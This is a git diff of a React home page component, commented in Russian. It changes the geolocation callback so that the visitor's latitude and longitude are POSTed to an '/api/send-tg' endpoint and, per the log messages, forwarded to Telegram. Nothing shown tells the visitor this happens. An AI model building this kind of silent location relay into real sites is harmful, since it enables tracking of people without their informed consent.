@@ -7,15 +7,32 @@ export default function Home() {
   const [location, setLocation] = useState<{ lat: number; lon: number } | null>(
     null
   );
-
   useEffect(() => {
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          setLocation({
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-          });
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          setLocation({ lat, lon });
+
+          // отправляем координаты в наш API
+          try {
+            const res = await fetch("/api/send-tg", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ lat, lon }),
+            });
+
+            const data = await res.json();
+            if (data.ok) {
+              console.log("✅ Геолокация успешно отправлена в Telegram");
+            } else {
+              console.error("❌ Ошибка при отправке:", data.error);
+            }
+          } catch (error) {
+            console.error("Ошибка отправки в Telegram:", error);
+          }
         },
         (error) => {
           console.error("Ошибка получения геолокации:", error);
